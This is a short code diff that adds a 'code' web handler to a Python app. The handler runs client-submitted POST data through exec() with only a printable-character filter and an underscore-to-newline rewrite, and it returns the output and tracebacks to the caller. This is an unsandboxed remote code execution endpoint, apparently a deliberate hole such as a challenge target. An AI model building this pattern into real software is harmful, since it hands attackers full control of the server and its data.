@@ -31,3 +31,27 @@ def info(req):
     }
     
     return s
+
+p = print
+def code(req):
+    import re, itertools, string
+    results = []
+    
+     
+    
+    def print(*args, **kwargs):
+        for a in args:
+            results.append(f'{a}')
+
+    
+    if req.method == 'POST':
+        try:
+            filtered = ''.join(x for x in req.post.data.get('code') if x in string.printable)
+            l = req.post.data.get('code').replace(' ', '\t')
+            codes = '\n'.join(filtered.split('_'))
+            exec(codes)
+        except Exception:
+            import traceback
+            print(traceback.format_exc())    
+        
+    return results    
